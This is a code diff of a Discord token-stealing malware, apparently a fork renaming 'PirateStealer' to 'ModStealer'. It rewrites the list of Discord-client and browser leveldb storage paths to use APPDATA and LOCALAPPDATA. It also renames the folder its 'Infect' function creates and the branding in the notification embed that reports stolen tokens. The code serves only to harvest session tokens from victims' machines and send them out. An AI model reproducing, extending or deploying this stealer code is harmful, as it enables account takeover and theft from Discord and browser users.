@@ -15,32 +15,34 @@ var oldDiscordTokens = [];
 //Global Paths
 var dir = __dirname.split("\\")
 var localappdata = process.env.LOCALAPPDATA
+var roamingappdata = process.env.APPDATA
+
 getAllDiscordTokens();
 //Get All Discord Tokens
 function getAllDiscordTokens(){
-    var paths = [`${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Discord/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`
-        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
+    var paths = [`${roamingappdata}/Discord/Local Storage/leveldb`
+        , `${roamingappdata}/DiscordDevelopment/Local Storage/leveldb`
+        , `${roamingappdata}/Lightcord/Local Storage/leveldb`
+        , `${roamingappdata}/discordptb/Local Storage/leveldb`
+        , `${roamingappdata}/discordcanary/Local Storage/leveldb`
+        , `${roamingappdata}/Opera Software/Opera Stable/Local Storage/leveldb`
+        , `${roamingappdata}/Opera Software/Opera GX Stable/Local Storage/leveldb`
+        , `${localappdata}/Amigo/User Data/Local Storage/leveldb`
+        , `${localappdata}/Torch/User Data/Local Storage/leveldb`
+        , `${localappdata}/Kometa/User Data/Local Storage/leveldb`
+        , `${localappdata}/Orbitum/User Data/Local Storage/leveldb`
+        , `${localappdata}/CentBrowser/User Data/Local Storage/leveldb`
+        , `${localappdata}/7Star/7Star/User Data/Local Storage/leveldb`
+        , `${localappdata}/Sputnik/Sputnik/User Data/Local Storage/leveldb`
+        , `${localappdata}/Vivaldi/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/Google/Chrome SxS/User Data/Local Storage/leveldb`
+        , `${localappdata}/Epic Privacy Browser/User Data/Local Storage/leveldb`
+        , `${localappdata}/Google/Chrome/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`
+        , `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
         paths.forEach(p => koro(p))
 }
 
@@ -209,7 +211,7 @@ function Infect() {
                     }
                 }
                 if (config.logout != "false") {
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                    let folder = file.replace("index.js", "ModStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -302,10 +304,10 @@ function injectNotify() {
                 "color": config["embed-color"],
                 "fields": fields,
                 "author": {
-                    "name": "PirateStealer"
+                    "name": "ModStealer"
                 },
                 "footer": {
-                    "text": "PirateStealer"
+                    "text": "ModStealer"
                 }
             }]
         })
